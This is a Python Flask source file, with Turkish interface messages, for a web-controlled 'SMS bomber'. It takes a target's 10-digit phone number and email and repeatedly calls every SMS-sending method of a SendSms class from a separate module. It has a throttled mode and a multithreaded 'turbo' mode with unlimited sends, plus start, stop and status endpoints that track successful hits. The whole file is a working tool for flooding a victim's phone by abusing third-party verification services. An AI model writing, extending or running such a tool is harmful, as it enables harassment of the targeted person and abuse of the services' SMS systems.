import os
import sys
import re
import threading
import builtins
from time import sleep
from flask import Flask, render_template, jsonify, request

# Import the SendSms class from the local sms.py file
from sms import SendSms

app = Flask(__name__)

# Global state to keep track of the current SMS bombing task
active_task = {
    "running": False,
    "phone": "",
    "mail": "",
    "count": None,      # None means infinite
    "interval": 1,
    "mode": "normal",
    "success": 0,
    "failed": 0,
    "logs": [],
    "stop_event": None,
    "thread": None
}

# Regex to strip ANSI escape codes (color codes) from print statements
ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
_original_print = builtins.print

# Override the built-in print function to capture outputs from the bombing threads
def custom_print(*args, **kwargs):
    msg = " ".join(map(str, args))
    clean_msg = ansi_escape.sub('', msg)
    
    current_thread = threading.current_thread()
    # Check if the print statement is coming from one of our bomber threads
    if current_thread.name.startswith("BomberThread"):
        # Update statistics based on log output
        if "[+]" in clean_msg:
            active_task["success"] += 1
        elif "[-]" in clean_msg:
            active_task["failed"] += 1
            
        # Record the clean log message
        active_task["logs"].append(clean_msg)
        if len(active_task["logs"]) > 500:
            active_task["logs"].pop(0)
            
    _original_print(msg, **kwargs)

# Hook our custom print
builtins.print = custom_print


def normal_bomb_runner(phone, mail, count, interval, stop_event):
    """
    Executes SMS bombing sequentially with a user-specified delay interval.
    """
    try:
        sms = SendSms(phone, mail)
        
        # Discover all callable SMS services dynamically using reflection
        services = []
        for attribute in dir(SendSms):
            attribute_value = getattr(SendSms, attribute)
            if callable(attribute_value) and not attribute.startswith('__'):
                services.append(attribute)
                
        # Main bombing loop
        while not stop_event.is_set():
            for service_name in services:
                if stop_event.is_set():
                    break
                
                # Check if we reached the requested SMS count
                if count is not None and active_task["success"] >= count:
                    print(f"[Info] Hedeflenen SMS sayısına ulaşıldı ({count}). Gönderim durduruldu.")
                    active_task["running"] = False
                    return
                
                # Execute the service
                try:
                    method = getattr(sms, service_name)
                    method()
                except Exception as e:
                    print(f"[-] Hata: {service_name} çağrılırken hata oluştu: {str(e)}")
                
                # Sleep interval with short checks for faster stops
                for _ in range(int(interval * 10)):
                    if stop_event.is_set():
                        break
                    sleep(0.1)
                    
            if count is not None and active_task["success"] >= count:
                break
    except Exception as e:
        print(f"[-] Kritik Hata: {str(e)}")
    finally:
        active_task["running"] = False


def turbo_bomb_runner(phone, mail, count, stop_event):
    """
    Executes SMS bombing concurrently using multiple threads for maximum speed.
    """
    try:
        sms = SendSms(phone, mail)
        
        # Discover all callable SMS services dynamically
        services = []
        for attribute in dir(SendSms):
            attribute_value = getattr(SendSms, attribute)
            if callable(attribute_value) and not attribute.startswith('__'):
                services.append(attribute)
                
        while not stop_event.is_set():
            if count is not None and active_task["success"] >= count:
                print(f"[Info] Hedeflenen SMS sayısına ulaşıldı ({count}). Gönderim durduruldu.")
                break
                
            threads = []
            for service_name in services:
                if stop_event.is_set():
                    break
                if count is not None and active_task["success"] >= count:
                    break
                
                method = getattr(sms, service_name)
                # Create a sub-thread named BomberThread_sub to capture its output
                t = threading.Thread(target=method, name="BomberThread_sub", daemon=True)
                threads.append(t)
                t.start()
                
            # Wait for all threads in this batch to complete (or for stop event)
            for t in threads:
                while t.is_alive() and not stop_event.is_set():
                    t.join(timeout=0.1)
                    
            # Small cooldown between batches in Turbo mode to prevent thread bloat
            for _ in range(10):
                if stop_event.is_set():
                    break
                sleep(0.1)
    except Exception as e:
        print(f"[-] Kritik Hata (Turbo): {str(e)}")
    finally:
        active_task["running"] = False


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/start", methods=["POST"])
def start_bombing():
    if active_task["running"]:
        return jsonify({"success": False, "message": "Zaten çalışan bir işlem var!"}), 400
        
    data = request.get_json() or {}
    phone = data.get("phone", "").strip()
    mail = data.get("mail", "").strip()
    count_raw = data.get("count")
    interval_raw = data.get("interval", 1)
    mode = data.get("mode", "normal")
    
    # Validation
    if not phone or len(phone) != 10 or not phone.isdigit():
        return jsonify({"success": False, "message": "Telefon numarası başında sıfır (+90) olmadan 10 haneli olmalıdır!"}), 400
        
    # Parse count
    count = None
    if count_raw is not None and str(count_raw).strip() != "":
        try:
            count = int(count_raw)
            if count <= 0:
                raise ValueError
        except ValueError:
            return jsonify({"success": False, "message": "Gönderim sayısı pozitif bir tam sayı olmalıdır!"}), 400
            
    # Parse interval
    try:
        interval = float(interval_raw)
        if interval < 0.1:
            interval = 0.1
    except (ValueError, TypeError):
        interval = 1.0
        
    # Reset stats
    active_task["running"] = True
    active_task["phone"] = phone
    active_task["mail"] = mail
    active_task["count"] = count
    active_task["interval"] = interval
    active_task["mode"] = mode
    active_task["success"] = 0
    active_task["failed"] = 0
    active_task["logs"] = [f"[System] SMS Gönderimi başlatıldı: Numara = {phone}, Mod = {mode.upper()}"]
    
    stop_event = threading.Event()
    active_task["stop_event"] = stop_event
    
    # Start the runner thread
    if mode == "turbo":
        thread = threading.Thread(
            target=turbo_bomb_runner,
            args=(phone, mail, count, stop_event),
            name="BomberThread_main",
            daemon=True
        )
    else:
        thread = threading.Thread(
            target=normal_bomb_runner,
            args=(phone, mail, count, interval, stop_event),
            name="BomberThread_main",
            daemon=True
        )
        
    active_task["thread"] = thread
    thread.start()
    
    return jsonify({"success": True, "message": "İşlem başarıyla başlatıldı."})


@app.route("/api/stop", methods=["POST"])
def stop_bombing():
    if not active_task["running"]:
        return jsonify({"success": False, "message": "Çalışan bir işlem yok!"}), 400
        
    if active_task["stop_event"]:
        active_task["stop_event"].set()
        active_task["logs"].append("[System] Gönderim durduruluyor...")
        
    return jsonify({"success": True, "message": "Durdurma sinyali gönderildi."})


@app.route("/api/status", methods=["GET"])
def get_status():
    return jsonify({
        "running": active_task["running"],
        "phone": active_task["phone"],
        "mail": active_task["mail"],
        "count": active_task["count"],
        "interval": active_task["interval"],
        "mode": active_task["mode"],
        "success": active_task["success"],
        "failed": active_task["failed"],
        "logs": active_task["logs"]
    })


if __name__ == "__main__":
    # Create templates directory if it doesn't exist
    os.makedirs(os.path.join(os.path.dirname(__file__), "templates"), exist_ok=True)
    port = int(os.environ.get("PORT", 5000))
    print(f"Flask Server running at http://localhost:{port}")
    app.run(host="0.0.0.0", port=port, debug=False)
